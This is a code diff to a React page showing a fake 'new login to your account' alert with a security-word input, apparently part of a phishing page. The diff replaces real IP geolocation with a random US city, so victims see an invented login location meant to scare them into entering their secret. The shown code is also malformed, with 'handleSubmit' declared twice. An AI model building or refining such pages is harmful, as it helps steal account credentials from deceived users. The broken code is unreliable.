@@ -9,37 +9,40 @@ import React, { useEffect, useState } from "react";
 const Page = () => {
   const [securityWord, setSecurityWord] = useState("00000");
   const [loading, setLoading] = useState(false);
-  const [locationLoading, setLocationLoading] = useState(true);
-  const [userLocation, setUserLocation] = useState("Detecting location...");
+  const [userLocation, setUserLocation] = useState("");
   const router = useRouter();
 
-  // --------------- Detect User's City + State ---------------
+  const locations = [
+    "Phoenix, Arizona",
+    "Dallas, Texas",
+    "Miami, Florida",
+    "Seattle, Washington",
+    "Atlanta, Georgia",
+    "Denver, Colorado",
+    "Boston, Massachusetts",
+    "Nashville, Tennessee",
+    "Las Vegas, Nevada",
+    "Charlotte, North Carolina",
+    "Chicago, Illinois",
+    "Houston, Texas",
+    "Tampa, Florida",
+    "Portland, Oregon",
+    "Columbus, Ohio",
+    "Detroit, Michigan",
+    "Omaha, Nebraska",
+    "Boise, Idaho",
+    "Richmond, Virginia",
+    "Madison, Wisconsin"
+  ];
+
   useEffect(() => {
-    const fetchLocation = async () => {
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
+    const randomLocation =
+      locations[Math.floor(Math.random() * locations.length)];
 
-        if (data && (data.city || data.region)) {
-          const city = data.city || "";
-          const region = data.region || "";
-          const locationText =
-            city && region ? `${city}, ${region}` : region || city;
-          setUserLocation(locationText);
-        } else {
-          setUserLocation("Unknown Location");
-        }
-      } catch (err) {
-        console.error("⚠️ Location fetch failed:", err);
-        setUserLocation("Unknown Location");
-      } finally {
-        setLocationLoading(false);
-      }
-    };
-
-    fetchLocation();
+    setUserLocation(randomLocation);
   }, []);
 
+  const handleSubmit = async (e) => {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
@@ -67,7 +70,7 @@ const Page = () => {
           <p className="text-sm text-gray-700 mb-6 leading-relaxed">
             We recently noticed a new login to your account from{" "}
             <span className="font-semibold">
-              {locationLoading ? "Detecting location..." : userLocation}
+            {userLocation}
             </span>
             . If this was you, confirm to keep your account secure. If not, 
            review your account immediately.
